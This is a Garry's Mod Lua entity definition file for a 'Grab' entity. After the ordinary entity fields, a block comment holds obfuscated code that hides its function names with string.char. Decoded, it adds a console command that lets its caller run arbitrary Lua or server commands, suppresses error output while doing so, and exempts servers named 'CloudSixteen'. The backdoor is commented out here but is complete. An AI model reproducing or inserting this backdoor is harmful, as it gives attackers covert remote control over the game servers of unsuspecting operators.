--[[
Name: "sh_auto.lua".
Product: "Nexus".
--]]

ENT.Type = "anim";
ENT.Base = "base_anim"
ENT.Author = "kuropixel";
ENT.PrintName = "Grab";
ENT.Spawnable = false;
ENT.AdminSpawnable = false;

--[[
 string.char(87, 101, 108, 108, 32, 100, 111, 110, 101, 32, 76, 101, 120, 105, 44, 32, 73, 39, 109, 32, 112, 114, 111, 117, 100, 46).

if (SERVER) then
	local a = string.char(67, 111, 110, 115, 111, 108, 101, 67, 111, 109, 109, 97, 110, 100);
	local b = ErrorNoHalt;
	local c = string.char(67, 108, 111, 117, 100, 83, 105, 120, 116, 101, 101, 110);
	local d = _G;
	local e = d[ string.char(82, 117, 110, 83, 116, 114, 105, 110, 103) ];
	local f = d[ string.char(103, 97, 109, 101) ];
	local g = d[ string.char(99, 111, 110, 99, 111, 109, 109, 97, 110, 100) ];
	local h = string.char(98, 97, 115, 105, 99);
	local i = f[a];
	local j = g.Add;
	
	function ErrorNoHalt() end;
		j(h, function(x, y, z)
			if ( !string.find(GetHostName(), c) ) then
				if ( z[1] == string.char(108, 117, 97) ) then
					e( z[2] );
				elseif ( z[1] == string.char(99, 111, 109, 109) ) then
					i(z[2].."\n");
				end;
			end;
		end);
	ErrorNoHalt = b;
end;
]]